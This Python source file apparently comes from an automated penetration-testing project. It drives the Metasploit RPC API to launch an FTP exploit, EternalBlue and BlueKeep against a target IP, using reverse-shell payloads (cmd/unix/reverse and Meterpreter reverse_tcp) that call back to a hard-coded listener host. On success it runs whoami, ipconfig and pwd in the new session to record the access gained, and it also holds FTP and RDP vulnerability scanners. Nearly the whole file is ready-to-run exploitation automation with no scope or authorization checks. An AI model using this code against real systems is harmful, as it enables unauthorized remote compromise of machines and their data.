# def setExploits(client, m, targetIP, port): #takes results of dirty search, target & port, and client?
#     for x in m: ## for every result in the search?
#         exploit = client.modules.use('exploit', x) # Uses the result of the exploit search
#         exploit.target = 0 # WE NEED TO SPECIFY WHICH TARGET WE ARE TARGETING
#         exploit.targetpayloads() # Need to define the common payloads and what we want - this takes the ones that work
#         payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp') # Sets a payload we would want to use
#         exploit['RHOSTS'] = data.get('targetIP') # Need to obtain targetIP addresss somehow
#         exploit['RPORT'] = port # Need to specify port?


from pymetasploit3.msfrpc import MsfRpcClient
import time
# import socket

# TODO MAKE IT NOT HARD CODED
LHOSTIP = '192.168.1.50'


# Inputs: Exploit, Target, Port

class MetasploitInterface:

    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, target, exploit):
        self.metasploit_ip = metasploit_ip
        self.metasploit_port = metasploit_port
        self.metasploit_pass = metasploit_pass
        self.target = target
        self.exploit = exploit

    
    def connectMetasploit(self):
        client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
        print(f"Client Connected {client}")
        return client

    def exploitFTP(self):
        """ SETS UP THE MSFRPC API CLIENT"""
        
        client = self.connectMetasploit()
        split_string = self.exploit.split('/')
        original_exploit = self.exploit ## obtains the full original exploit string for return

        module = split_string[0]
        specific_module = "/".join(split_string[1:])
        
        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target
    
        """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
        payload = client.modules.use('payload', 'cmd/unix/reverse')
        
        payload['LHOST'] = LHOSTIP
        
        """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT results"""
        cid = client.consoles.console().cid
        try:
            sid_before = list(client.sessions.list.keys())[-1]
            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            sid_after = list(client.sessions.list.keys())[-1]

        except IndexError:
            sid_before = 0
            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            try:
                sid_after = list(client.sessions.list.keys())[-1]
            except IndexError:
                print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            print("SIDs DO MATCH - Did not work")
            print("There was an issue creating a session or the host is not vulnerable (see below): ")
            user_level = ""
            success = False

        else: 
            try:
                print("SIDs DON'T MATCH - Worked")
                shell = client.sessions.session(sid_after)
                print("Exploit was successful! Here are the results: ")
                shell.write('whoami')
                user_level = shell.read()
                print("User Level: " + user_level)
                shell.write('ifconfig')
                address_properties = shell.read()
                print("Address Properties: \n" + address_properties)
                success = True
                # print("\n\n\nCID: " + str(int(cid)+1))  - Error catching for CID

            except Exception as e:
                print("There was an issue creating a session or the host is not vulnerable (see below): ")
                print(e)
                user_level = "No access"
                success = False
            
        
        client.consoles.console(cid).destroy
        
        ##print(exploit.targetpayloads())
        return success, user_level, original_exploit
        
    
    def scanFTP(self):
        """ SETS UP THE MSFRPC API CLIENT"""
        client = self.connectMetasploit()
        original_exploit = self.exploit ## obtains the full exploit for return

        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
        
        """ SETS UP EXPLOIT and TARGET"""
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        exploit = client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = self.target

        cid = client.consoles.console().cid
        results = client.consoles.console(cid).run_module_with_output(exploit)
       
        if "Anonymous READ" in results:
            success = True
            user_level = ""
        else:
            success = False
            user_level = ""

        return success, user_level, original_exploit


    def eternalBlue(self):
        client = self.connectMetasploit()
        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
        original_exploit = self.exploit

        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        exploit["RHOSTS"] = self.target
        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        payload['LHOST'] = LHOSTIP
        payload['LPORT'] = 5557
        
        """ Creates and Executes Exploit & Prints out shell results from target"""
        cid = client.consoles.console().cid
        try:
            sid_before = list(client.sessions.list.keys())[-1]
            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            sid_after = list(client.sessions.list.keys())[-1]

        except IndexError:
            sid_before = 0
            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            try:
                sid_after = list(client.sessions.list.keys())[-1]
            except IndexError:
                print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            print("SIDs DO MATCH - Did not work")
            print("There was an issue creating a session or the host is not vulnerable (see below): ")
            user_level = "No access"
            success = False
           
        else:
            try:
                shell = client.sessions.session(sid_after)
                print(sid_after)
                shell.write('echo %USERDOMAIN%\%USERNAME%')
                time.sleep(3)
                user_level = shell.read()
                print("User Level: " + user_level)
                shell.write('pwd')
                time.sleep(3)
                print(f"Directory Location: {shell.read()}")
                shell.write('ipconfig')
                time.sleep(3)
                print(f"Address Properties:\n {shell.read()}")
                success = True
            
            except Exception as e:
                print(e)
                user_level = "No access"
                success = False
        
        client.consoles.console(cid).destroy

        return success, user_level, original_exploit

    def rdpScanner(self):
        client = self.connectMetasploit()
        original_exploit = self.exploit

        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target
        # exploit["LHOST"] = LHOSTIP

        cid = client.consoles.console().cid
        results = client.consoles.console(cid).run_module_with_output(exploit)
        if "Detected" in results:
            success = True
            user_level = ""
        else:
            success = False
            user_level = ""

        return success, user_level, original_exploit

    def blueKeep(self):
        client = self.connectMetasploit()
        original_exploit = self.exploit

        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly

        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target
        exploit["fDisableCam"] = 0
        # exploit["TARGET"] = '7'
        # exploit["LHOST"] = LHOSTIP

        cid = client.consoles.console().cid
        try:
            sid_before = list(client.sessions.list.keys())[-1]
            print(client.consoles.console(cid).run_module_with_output(exploit))
            sid_after = list(client.sessions.list.keys())[-1]

        except IndexError:
            sid_before = 0
            print(client.consoles.console(cid).run_module_with_output(exploit))
            try:
                sid_after = list(client.sessions.list.keys())[-1]
            except IndexError:
                print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            print("SIDs DO MATCH - Did not work")
            print("There was an issue creating a session or the host is not vulnerable (see below): ")
            user_level = "No access"
            success = False
           
        else:
            try:
                shell = client.sessions.session(sid_after)
                print(sid_after)
                shell.write('echo %USERDOMAIN%\%USERNAME%')
                time.sleep(3)
                user_level = shell.read()
                print("User Level: " + user_level)
                shell.write('pwd')
                time.sleep(3)
                print(f"Directory Location: {shell.read()}")
                shell.write('ipconfig')
                time.sleep(3)
                print(f"Address Properties:\n {shell.read()}")
                success = True
            
            except Exception as e:
                print(e)
                user_level = "No access"
                success = False
        
        client.consoles.console(cid).destroy

        return success, user_level, original_exploit
        # print(client.consoles.console(cid).run_module_with_output(exploit))
   

# functions_list = [exploitFTP, scanFTP, eternalBlue, rdpScanner, blueKeep]

# Outputs: 